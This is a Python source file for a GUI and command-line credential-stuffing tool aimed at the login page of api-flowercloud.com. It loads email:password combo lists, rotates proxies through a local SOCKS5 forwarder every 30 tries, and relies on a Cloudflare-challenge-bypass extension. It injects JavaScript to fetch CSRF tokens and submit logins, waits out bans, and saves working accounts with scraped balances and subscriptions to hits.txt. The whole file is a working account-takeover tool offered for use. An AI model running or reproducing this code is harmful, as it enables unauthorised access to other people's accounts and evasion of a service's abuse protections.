# -*- coding: utf-8 -*-
"""
============================================================
  花云批量登录 v5.1 - 手动加插件 + 不关浏览器切IP
============================================================
  架构:
  Chrome(127.0.0.1:本地端口) → 本地SOCKS5转发器 → 上游代理(动态切换)
  
  流程:
  1. 启动N个Chrome窗口 (每个连自己的本地转发端口)
  2. 提示用户手动给每个窗口加过盾插件
  3. 用户确认后, 开始批量登录
  4. 每30条自动切IP: 转发器切上游 → 刷新页面 → 插件自动过盾
  5. 浏览器全程不关闭!
============================================================
"""
import sys
import os
import time
import random
import re
import threading
import queue
import gc

try:
    from DrissionPage import ChromiumPage, ChromiumOptions
except ImportError:
    print("[!] 请安装 DrissionPage: pip install DrissionPage")
    sys.exit(1)

try:
    import customtkinter as ctk
    from tkinter import filedialog, messagebox
    HAS_GUI = True
except ImportError:
    HAS_GUI = False

from proxy_checker import Proxy, load_proxies_from_file
from local_proxy import LocalSocks5Forwarder

# ============ 配置 ============
TARGET_BASE = "https://api-flowercloud.com"
TARGET_PAGE = TARGET_BASE + "/clientarea.php"

COMBO_FILE = "combo_f.txt"
PROXY_FILE = "alive_proxies.txt"
GOOD_FILE = "hits.txt"

COMBO_PER_IP = 30
DELAY_PER_REQ = 2.0
BAN_WAIT = 180
CF_WAIT_MAX = 90
TOKEN_REFRESH_EVERY = 25
MAX_WORKERS = 3
BASE_CHROME_PORT = 9300
BASE_LOCAL_PROXY_PORT = 8100


# ============ 工具函数 ============
def save_result(filename, content):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(content + "\n")


def page_is_ready(page):
    """判断页面是否真正加载完成 (排除CF challenge页)"""
    try:
        html = page.html
        if not html or len(html) < 3000:
            return False
        html_lower = html.lower()
        cf_signs = ['challenges.cloudflare.com', 'cf-turnstile', 'just a moment',
                    'checking your browser', 'cf_chl_opt']
        for sign in cf_signs:
            if sign in html_lower:
                return False
        if 'clientarea' in html_lower or 'logout.php' in html_lower or 'inputemail' in html_lower:
            return True
        if len(html) > 15000:
            return True
        return False
    except Exception:
        return False


def is_banned(page):
    try:
        html = page.html
        if html and len(html) < 3000:
            h = html.lower()
            if "403 forbidden" in h or "openresty" in h or "429" in h or "been blocked" in h:
                return True
        return False
    except Exception:
        return False


def has_login_form(page):
    try:
        return page.run_js(
            "return !!(document.querySelector('#inputEmail') || "
            "document.querySelector('input[name=\"username\"]') || "
            "document.querySelector('input[type=\"email\"]'))")
    except Exception:
        return False


def is_logged_in(page):
    try:
        return "logout.php" in page.html.lower()
    except Exception:
        return False


def wait_for_page_ready(page, max_wait=CF_WAIT_MAX, log_func=None):
    """等待页面就绪 (插件会自动过盾, 我们只需等)"""
    start = time.time()
    while time.time() - start < max_wait:
        if is_banned(page):
            if log_func:
                log_func("[等待] 检测到封禁")
            return False
        if page_is_ready(page):
            return True
        time.sleep(3)
    return page_is_ready(page)


def logout_force(page):
    try:
        page.run_js("try{var x=new XMLHttpRequest();x.open('GET','/logout.php',false);x.send();}catch(e){}")
    except Exception:
        pass
    time.sleep(0.5)


def reload_form_silent(page):
    js = """
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/clientarea.php', false);
        xhr.send();
        if(xhr.status === 403 || xhr.status === 429) return 'banned';
        var html = xhr.responseText || '';
        var m = html.match(/name="token"\\s*value="([^"]+)"/);
        if(!m) m = html.match(/name='token'\\s*value='([^']+)'/);
        if(m && m[1]) {
            var el = document.querySelector('input[name="token"]');
            if(el) { el.value = m[1]; }
            return 'ok';
        }
        return 'no_token';
    } catch(e) { return 'error'; }
    """
    try:
        return page.run_js(js) == "ok"
    except Exception:
        return False


def do_login_xhr(page, email, password):
    js = """
    var token = '';
    var tokenEl = document.querySelector('input[name="token"]');
    if(tokenEl) token = tokenEl.value;
    if(!token) { var cv = (typeof csrfToken !== 'undefined') ? csrfToken : ''; token = cv; }
    if(!token) {
        try {
            var pre = new XMLHttpRequest();
            pre.open('GET', '/clientarea.php', false);
            pre.send();
            if(pre.status === 403 || pre.status === 429) return 'banned:pre';
            var preHtml = pre.responseText || '';
            if(preHtml.indexOf('logout.php') !== -1) return 'need_logout';
            var tm = preHtml.match(/name="token"\\s*value="([^"]+)"/);
            if(!tm) tm = preHtml.match(/name='token'\\s*value='([^']+)'/);
            if(tm && tm[1]) { token = tm[1]; if(tokenEl) tokenEl.value = token; }
        } catch(e) {}
    }
    if(!token) return 'error:no_token';
    var body = 'token=' + encodeURIComponent(token) + '&username=' + encodeURIComponent(arguments[0]) + '&password=' + encodeURIComponent(arguments[1]);
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/dologin.php', false);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send(body);
        var status = xhr.status;
        if(status === 403 || status === 429) return 'banned:' + status;
        var html = xhr.responseText || '';
        var url = xhr.responseURL || '';
        if(url.indexOf('incorrect') !== -1) return 'bad';
        if(html.indexOf('incorrect') !== -1) return 'bad';
        if(html.indexOf('logout.php') !== -1) return 'good:' + html.substring(0, 15000);
        return 'bad';
    } catch(e) { return 'error:' + e.message; }
    """
    try:
        return page.run_js(js, email, password)
    except Exception:
        return "js_error"


def extract_info_from_html(html):
    info = {"balance": "unknown", "services": "0", "products": []}
    try:
        m = re.search(r'可用余额.*?<h3[^>]*>(.*?)</h3>', html, re.DOTALL)
        if m:
            info["balance"] = m.group(1).strip()
        m = re.search(r'action=services[^>]*>产品服务</a>\s*<span[^>]*>(\d+)</span>', html, re.DOTALL)
        if m:
            info["services"] = m.group(1)
        products = re.findall(
            r'action=productdetails&(?:amp;)?id=(\d+)">\s*<span class="cell-title">([^<]+)</span>', html)
        for pid, pname in products:
            expire = "unknown"
            em = re.search(r'id=' + pid + r'.*?到期时间:\s*</span>\s*([\d\-]+)', html, re.DOTALL)
            if em:
                expire = em.group(1)
            info["products"].append({"id": pid, "name": pname.strip(), "expire": expire})
    except Exception:
        pass
    return info


def format_info(info):
    parts = ["balance=" + info["balance"], "services=" + info["services"]]
    for p in info["products"]:
        parts.append(p["name"] + "(id=" + p["id"] + ",exp=" + p["expire"] + ")")
    return " | ".join(parts)



# ============================================================
# 代理管理器
# ============================================================
class ProxyManager:
    def __init__(self, proxies):
        self.all_proxies = list(proxies)
        self.available = queue.Queue()
        self.lock = threading.Lock()
        for p in self.all_proxies:
            self.available.put(p)

    def get_next(self):
        try:
            return self.available.get_nowait()
        except queue.Empty:
            return None

    def remaining(self):
        return self.available.qsize()

    def total(self):
        return len(self.all_proxies)


# ============================================================
# 单窗口Worker - 不关浏览器!
# ============================================================
class WindowWorker:
    """
    核心: 浏览器启动后永不关闭
    切IP通过本地转发器切换上游, 然后刷新页面(插件自动过盾)
    """

    def __init__(self, worker_id, proxy_manager, combo_queue, result_lock,
                 stats, log_func=None):
        self.worker_id = worker_id
        self.proxy_manager = proxy_manager
        self.combo_queue = combo_queue
        self.result_lock = result_lock
        self.stats = stats
        self.log_func = log_func
        self.page = None
        self.chrome_port = BASE_CHROME_PORT + worker_id
        self.local_proxy_port = BASE_LOCAL_PROXY_PORT + worker_id
        self.forwarder = None
        self.current_proxy = None
        self.running = True
        self.combo_count_on_ip = 0

    def log(self, msg):
        full = f"[W{self.worker_id}] {msg}"
        if self.log_func:
            self.log_func(full)
        else:
            print(full, flush=True)

    def start_forwarder(self):
        """启动本地代理转发器"""
        self.forwarder = LocalSocks5Forwarder(self.local_proxy_port, log_func=None)
        self.forwarder.start()

    def start_browser(self):
        """启动Chrome (只启动一次, 之后不关!)"""
        try:
            co = ChromiumOptions()
            co.set_local_port(self.chrome_port)
            co.set_argument('--no-first-run')
            co.set_argument('--no-default-browser-check')
            co.set_argument('--disable-infobars')
            co.set_argument('--disable-gpu')
            co.set_argument('--disable-dev-shm-usage')
            co.set_argument('--no-sandbox')
            co.set_argument('--disable-sync')
            co.set_argument('--disable-translate')
            co.set_argument('--silent-debugger-extension-api')
            # 固定连接本地转发器 (永远不变!)
            co.set_argument(f'--proxy-server=socks5://127.0.0.1:{self.local_proxy_port}')

            self.log(f"启动Chrome 端口{self.chrome_port}, 代理→本地转发器:{self.local_proxy_port}")
            self.page = ChromiumPage(co)
            return True
        except Exception as e:
            self.log(f"启动Chrome失败: {e}")
            return False

    def switch_ip(self):
        """
        切换IP (不关浏览器!):
        1. 从代理池取下一个代理
        2. 转发器切换上游
        3. 刷新页面 (插件自动过盾)
        4. 等待页面就绪
        """
        proxy = self.proxy_manager.get_next()
        if not proxy:
            self.log("没有更多可用代理!")
            return False

        self.current_proxy = proxy
        self.combo_count_on_ip = 0

        # 切换转发器上游
        self.forwarder.switch_upstream(proxy.host, proxy.port)
        self.log(f"切换IP -> {proxy.to_url()}")

        # 刷新页面 (插件会自动过盾)
        try:
            self.page.get(TARGET_PAGE)
        except Exception:
            pass

        time.sleep(5)

        # 等待页面就绪 (插件过盾中...)
        if not wait_for_page_ready(self.page, max_wait=CF_WAIT_MAX, log_func=self.log):
            if is_banned(self.page):
                self.log("此IP被封, 换下一个")
                return self.switch_ip()  # 递归换下一个
            self.log("过盾超时, 换下一个IP")
            return self.switch_ip()

        # 页面就绪
        if is_logged_in(self.page):
            logout_force(self.page)
            time.sleep(1)

        if has_login_form(self.page) or reload_form_silent(self.page):
            self.log(f"IP切换成功, 页面就绪 ✓ ({proxy.host})")
            return True

        # 再试一次
        time.sleep(3)
        if has_login_form(self.page) or reload_form_silent(self.page):
            self.log(f"IP切换成功 ✓ ({proxy.host})")
            return True

        self.log("切换后无法获取登录表单, 换下一个")
        return self.switch_ip()

    def handle_ban(self):
        """被封处理"""
        with self.result_lock:
            self.stats["bans"] += 1
        self.log(f"被封! 等{BAN_WAIT}s后换新IP...")
        waited = 0
        while waited < BAN_WAIT and self.running:
            chunk = min(30, BAN_WAIT - waited)
            time.sleep(chunk)
            waited += chunk
        if not self.running:
            return False
        return self.switch_ip()

    def run(self):
        """主循环"""
        # 第一次切IP
        if not self.switch_ip():
            self.log("无可用代理, 退出")
            return

        batch_count = 0

        while self.running:
            try:
                idx, email, password = self.combo_queue.get_nowait()
            except queue.Empty:
                break

            # 检查是否需要换IP
            if self.combo_count_on_ip >= COMBO_PER_IP:
                self.log(f"已跑{self.combo_count_on_ip}条, 换新IP...")
                if not self.switch_ip():
                    self.combo_queue.put((idx, email, password))
                    break

            # 定期刷新token
            if batch_count > 0 and batch_count % TOKEN_REFRESH_EVERY == 0:
                if not reload_form_silent(self.page):
                    self.page.get(TARGET_PAGE)
                    time.sleep(5)
                    wait_for_page_ready(self.page, max_wait=30)
                    if is_logged_in(self.page):
                        logout_force(self.page)
                        time.sleep(1)

            # 执行登录
            result = do_login_xhr(self.page, email, password)

            if result == "need_logout":
                logout_force(self.page)
                time.sleep(1)
                reload_form_silent(self.page)
                result = do_login_xhr(self.page, email, password)

            # 被封
            if isinstance(result, str) and result.startswith("banned:"):
                self.log(f"[{idx+1}] {email} -> BANNED!")
                if not self.handle_ban():
                    self.combo_queue.put((idx, email, password))
                    break
                result = do_login_xhr(self.page, email, password)
                if result == "need_logout":
                    logout_force(self.page)
                    time.sleep(1)
                    reload_form_silent(self.page)
                    result = do_login_xhr(self.page, email, password)
                if isinstance(result, str) and result.startswith("banned:"):
                    self.combo_queue.put((idx, email, password))
                    if not self.handle_ban():
                        break
                    continue

            # 处理结果
            self.combo_count_on_ip += 1
            batch_count += 1

            with self.result_lock:
                self.stats["processed"] += 1
                if isinstance(result, str) and result.startswith("good:"):
                    self.stats["hits"] += 1
                    html = result[5:]
                    info = extract_info_from_html(html)
                    svc = int(info["services"]) if info["services"].isdigit() else 0
                    tag = f"HIT[SUB={info['services']}]" if svc > 0 else "HIT[NOSUB]"
                    self.log(f"[{idx+1}] {email} -> {tag} {info['balance']}")
                    for p in info["products"]:
                        self.log(f"    -> {p['name']} exp:{p['expire']}")
                    save_result(GOOD_FILE, f"{email}:{password} | {format_info(info)}")
                    logout_force(self.page)
                    time.sleep(1)
                    reload_form_silent(self.page)
                elif result == "bad":
                    self.stats["failed"] += 1
                    self.log(f"[{idx+1}] {email} -> 失败")
                else:
                    self.stats["errors"] += 1
                    self.log(f"[{idx+1}] {email} -> err:{str(result)[:40]}")
                    if isinstance(result, str) and "no_token" in result:
                        reload_form_silent(self.page)

            time.sleep(random.uniform(DELAY_PER_REQ * 0.85, DELAY_PER_REQ * 1.15))

        self.log("工作结束")

    def cleanup(self):
        """清理 (仅在程序退出时)"""
        if self.forwarder:
            self.forwarder.stop()
        try:
            if self.page:
                self.page.quit()
        except Exception:
            pass



# ============================================================
# 多窗口调度引擎
# ============================================================
class MultiWindowEngine:
    def __init__(self, proxies, combos, max_workers=MAX_WORKERS, log_func=None):
        self.proxy_manager = ProxyManager(proxies)
        self.combos = combos
        self.max_workers = max_workers
        self.log_func = log_func

        self.combo_queue = queue.Queue()
        self.result_lock = threading.Lock()
        self.stats = {
            "processed": 0, "hits": 0, "failed": 0,
            "errors": 0, "bans": 0, "total": len(combos)
        }
        self.workers = []
        self.threads = []
        self.running = False

    def log(self, msg):
        if self.log_func:
            self.log_func(msg)
        else:
            print(msg, flush=True)

    def setup_browsers(self):
        """
        第一步: 启动所有浏览器窗口
        返回成功启动的 worker 列表
        """
        self.log(f"\n{'='*55}")
        self.log(f"  正在启动 {self.max_workers} 个浏览器窗口...")
        self.log(f"{'='*55}\n")

        for wid in range(self.max_workers):
            worker = WindowWorker(
                worker_id=wid,
                proxy_manager=self.proxy_manager,
                combo_queue=self.combo_queue,
                result_lock=self.result_lock,
                stats=self.stats,
                log_func=self.log_func
            )
            # 启动本地转发器
            worker.start_forwarder()
            time.sleep(0.5)

            # 启动浏览器
            if worker.start_browser():
                self.workers.append(worker)
                self.log(f"  [窗口 {wid}] Chrome 已启动 (端口:{worker.chrome_port})")
            else:
                self.log(f"  [窗口 {wid}] 启动失败!")
                worker.cleanup()

            time.sleep(2)

        return len(self.workers) > 0

    def start_work(self):
        """第三步: 开始批量工作"""
        self.running = True
        for i, (email, password) in enumerate(self.combos):
            self.combo_queue.put((i, email, password))

        self.log(f"\n[引擎] 开始工作!")
        self.log(f"[引擎] Combo: {len(self.combos)} | 代理: {self.proxy_manager.total()} | 窗口: {len(self.workers)}")
        self.log(f"[引擎] 每IP跑 {COMBO_PER_IP} 条 | 切IP不关浏览器")
        self.log(f"[引擎] 过盾: 依赖手动加载的CRX插件\n")

        for worker in self.workers:
            t = threading.Thread(target=worker.run, daemon=True)
            self.threads.append(t)
            t.start()
            time.sleep(3)

        threading.Thread(target=self._monitor, daemon=True).start()

    def stop(self):
        self.running = False
        for w in self.workers:
            w.running = False
        self.log("[引擎] 停止中...")

    def cleanup_all(self):
        for w in self.workers:
            w.cleanup()

    def _monitor(self):
        for t in self.threads:
            t.join()
        self.running = False
        s = self.stats
        self.log("\n" + "=" * 50)
        self.log(f"  完成! 处理:{s['processed']}/{s['total']}")
        self.log(f"  击中:{s['hits']} 失败:{s['failed']} 错误:{s['errors']} 封禁:{s['bans']}")
        self.log("=" * 50)


# ============================================================
# CLI模式 (主入口)
# ============================================================
def run_cli():
    print("\n" + "=" * 60)
    print("  花云批量登录 v5.1")
    print("  手动加插件 + 不关浏览器自动切IP")
    print("=" * 60)
    print("\n  工作原理:")
    print("  1. 启动N个Chrome, 每个连本地代理转发器")
    print("  2. 你手动给每个窗口加过盾插件")
    print("  3. 按Enter开始 → 自动切IP+过盾+登录")
    print("  4. 全程不关浏览器!\n")

    proxy_file = input(f"代理文件 (默认 {PROXY_FILE}): ").strip() or PROXY_FILE
    proxies = load_proxies_from_file(proxy_file)
    if not proxies:
        print("[!] 无代理")
        sys.exit(1)

    combo_file = input(f"Combo文件 (默认 {COMBO_FILE}): ").strip() or COMBO_FILE
    combos = []
    try:
        content = None
        for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
            try:
                with open(combo_file, "r", encoding=enc) as f:
                    content = f.read()
                break
            except (UnicodeDecodeError, UnicodeError):
                continue
        if content:
            for line in content.splitlines():
                line = line.strip()
                if line and ":" in line:
                    parts = line.split(":", 1)
                    combos.append((parts[0].strip(), parts[1].strip()))
    except Exception as e:
        print(f"[!] 加载combo失败: {e}")
        sys.exit(1)

    if not combos:
        print("[!] combo为空")
        sys.exit(1)

    workers_count = int(input(f"窗口数 (默认{MAX_WORKERS}): ").strip() or MAX_WORKERS)

    print(f"\n  代理: {len(proxies)} | Combo: {len(combos)} | 窗口: {workers_count}\n")

    engine = MultiWindowEngine(proxies=proxies, combos=combos, max_workers=workers_count)

    # === 第一步: 启动浏览器 ===
    if not engine.setup_browsers():
        print("[!] 没有成功启动任何浏览器!")
        sys.exit(1)

    # === 第二步: 等待用户手动加插件 ===
    print("\n" + "=" * 60)
    print("  ⚠️  请手动操作:")
    print(f"  已打开 {len(engine.workers)} 个Chrome窗口")
    print("  请给每个窗口安装过盾插件 (cf-autoclick-master)")
    print("")
    print("  方法: 将插件文件夹拖入 chrome://extensions")
    print("        或加载已解压的扩展程序")
    print("=" * 60)
    input("\n  >>> 所有窗口都加好插件后, 按 ENTER 开始运行 <<<\n")

    # === 第三步: 开始工作 ===
    engine.start_work()

    try:
        while engine.running:
            time.sleep(5)
            s = engine.stats
            remaining = engine.proxy_manager.remaining()
            print(f"  [进度:{s['processed']}/{s['total']} "
                  f"击中:{s['hits']} 失败:{s['failed']} "
                  f"封:{s['bans']} 剩余代理:{remaining}]")
    except KeyboardInterrupt:
        engine.stop()
    finally:
        engine.cleanup_all()


# ============================================================
# GUI模式
# ============================================================
if HAS_GUI:
    class FlowerLoginApp(ctk.CTk):
        def __init__(self):
            super().__init__()
            self.title("花云批量登录 v5.1 - 手动加插件 + 不关浏览器切IP")
            self.geometry("1100x750")
            self.minsize(1000, 650)
            ctk.set_appearance_mode("dark")
            ctk.set_default_color_theme("blue")
            self.engine = None
            self._build_ui()

        def _build_ui(self):
            top = ctk.CTkFrame(self)
            top.pack(fill="x", padx=10, pady=(10, 5))

            r0 = ctk.CTkFrame(top, fg_color="transparent")
            r0.pack(fill="x", padx=10, pady=4)
            ctk.CTkLabel(r0, text="v5.1 手动加插件 + 不关浏览器自动切IP",
                         font=("", 13, "bold"), text_color="#00E676").pack(side="left")

            r1 = ctk.CTkFrame(top, fg_color="transparent")
            r1.pack(fill="x", padx=10, pady=4)
            ctk.CTkLabel(r1, text="代理文件:").pack(side="left")
            self.proxy_var = ctk.StringVar(value="")
            ctk.CTkEntry(r1, textvariable=self.proxy_var, width=250).pack(side="left", padx=5)
            ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_proxy).pack(side="left", padx=(0, 15))
            ctk.CTkLabel(r1, text="Combo:").pack(side="left")
            self.combo_var = ctk.StringVar(value="combo_f.txt")
            ctk.CTkEntry(r1, textvariable=self.combo_var, width=250).pack(side="left", padx=5)
            ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_combo).pack(side="left")

            r2 = ctk.CTkFrame(top, fg_color="transparent")
            r2.pack(fill="x", padx=10, pady=4)
            ctk.CTkLabel(r2, text="窗口数:").pack(side="left")
            self.workers_var = ctk.StringVar(value="3")
            ctk.CTkEntry(r2, textvariable=self.workers_var, width=40).pack(side="left", padx=(5, 15))
            ctk.CTkLabel(r2, text="每IP条数:").pack(side="left")
            self.per_ip_var = ctk.StringVar(value="30")
            ctk.CTkEntry(r2, textvariable=self.per_ip_var, width=40).pack(side="left", padx=(5, 15))

            r3 = ctk.CTkFrame(top, fg_color="transparent")
            r3.pack(fill="x", padx=10, pady=4)
            self.btn_setup = ctk.CTkButton(r3, text="1.启动浏览器", width=120, fg_color="#2196F3", command=self._setup)
            self.btn_setup.pack(side="left", padx=5)
            self.btn_start = ctk.CTkButton(r3, text="2.开始运行", width=100, fg_color="#4CAF50",
                                           command=self._start, state="disabled")
            self.btn_start.pack(side="left", padx=5)
            self.btn_stop = ctk.CTkButton(r3, text="停止", width=80, fg_color="#F44336", command=self._stop)
            self.btn_stop.pack(side="left", padx=5)
            self.status_lbl = ctk.CTkLabel(r3, text="第1步: 点击[启动浏览器]",
                                           text_color="#FFEB3B", font=("", 12, "bold"))
            self.status_lbl.pack(side="right", padx=10)

            info = ctk.CTkFrame(self)
            info.pack(fill="x", padx=10, pady=5)
            self.lbl_progress = ctk.CTkLabel(info, text="进度: 0/0")
            self.lbl_progress.pack(side="left", padx=10)
            self.lbl_hits = ctk.CTkLabel(info, text="击中: 0", text_color="#00E676", font=("", 12, "bold"))
            self.lbl_hits.pack(side="left", padx=10)
            self.lbl_failed = ctk.CTkLabel(info, text="失败: 0")
            self.lbl_failed.pack(side="left", padx=10)
            self.lbl_bans = ctk.CTkLabel(info, text="封禁: 0", text_color="#FF9800")
            self.lbl_bans.pack(side="left", padx=10)
            self.lbl_proxies = ctk.CTkLabel(info, text="剩余代理: 0")
            self.lbl_proxies.pack(side="left", padx=10)

            self.pbar = ctk.CTkProgressBar(self, height=8)
            self.pbar.pack(fill="x", padx=10, pady=4)
            self.pbar.set(0)

            lf = ctk.CTkFrame(self)
            lf.pack(fill="both", expand=True, padx=10, pady=(5, 10))
            self.log_box = ctk.CTkTextbox(lf, font=("Consolas", 11))
            self.log_box.pack(fill="both", expand=True, padx=5, pady=5)

            self._refresh_stats()

        def _pick_proxy(self):
            p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
            if p:
                self.proxy_var.set(p)

        def _pick_combo(self):
            p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
            if p:
                self.combo_var.set(p)

        def _log(self, msg):
            def _do():
                self.log_box.insert("end", msg + "\n")
                self.log_box.see("end")
            self.after(0, _do)

        def _refresh_stats(self):
            if self.engine:
                s = self.engine.stats
                self.lbl_progress.configure(text=f"进度: {s['processed']}/{s['total']}")
                self.lbl_hits.configure(text=f"击中: {s['hits']}")
                self.lbl_failed.configure(text=f"失败: {s['failed']}")
                self.lbl_bans.configure(text=f"封禁: {s['bans']}")
                self.lbl_proxies.configure(text=f"剩余代理: {self.engine.proxy_manager.remaining()}")
                if s['total'] > 0:
                    self.pbar.set(s['processed'] / s['total'])
            self.after(1000, self._refresh_stats)

        def _setup(self):
            """启动浏览器"""
            proxies = load_proxies_from_file(self.proxy_var.get())
            if not proxies:
                messagebox.showwarning("提示", "代理文件为空!")
                return

            combos = []
            combo_path = self.combo_var.get()
            try:
                content = None
                for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
                    try:
                        with open(combo_path, "r", encoding=enc) as f:
                            content = f.read()
                        break
                    except (UnicodeDecodeError, UnicodeError):
                        continue
                if content:
                    for line in content.splitlines():
                        line = line.strip()
                        if line and ":" in line:
                            parts = line.split(":", 1)
                            combos.append((parts[0].strip(), parts[1].strip()))
            except Exception as e:
                messagebox.showwarning("错误", f"加载combo失败: {e}")
                return
            if not combos:
                messagebox.showwarning("提示", "Combo为空!")
                return

            global COMBO_PER_IP
            COMBO_PER_IP = int(self.per_ip_var.get() or 30)
            workers = int(self.workers_var.get() or 3)

            self.engine = MultiWindowEngine(
                proxies=proxies, combos=combos,
                max_workers=workers, log_func=self._log
            )

            self._log("[第1步] 正在启动浏览器...")
            self.btn_setup.configure(state="disabled")

            def do_setup():
                ok = self.engine.setup_browsers()
                def update():
                    if ok:
                        n = len(self.engine.workers)
                        self._log(f"\n[第2步] 已启动 {n} 个窗口!")
                        self._log("  请手动给每个窗口安装过盾插件")
                        self._log("  然后点击 [2.开始运行]\n")
                        self.status_lbl.configure(text=f"已启动{n}个窗口, 请加插件后点[开始运行]",
                                                  text_color="#FFEB3B")
                        self.btn_start.configure(state="normal")
                    else:
                        self._log("[!] 启动失败!")
                        self.btn_setup.configure(state="normal")
                self.after(0, update)

            threading.Thread(target=do_setup, daemon=True).start()

        def _start(self):
            """开始运行"""
            if not self.engine:
                return
            self._log("[第3步] 开始批量登录!")
            self.status_lbl.configure(text="运行中...", text_color="#00E676")
            self.btn_start.configure(state="disabled")
            threading.Thread(target=self.engine.start_work, daemon=True).start()

        def _stop(self):
            if self.engine:
                self.engine.stop()
            self.status_lbl.configure(text="已停止", text_color="#F44336")
            self.btn_start.configure(state="normal")
            self._log("[停止]")


# ============================================================
if __name__ == "__main__":
    if HAS_GUI and "--cli" not in sys.argv:
        app = FlowerLoginApp()
        app.mainloop()
    else:
        run_cli()
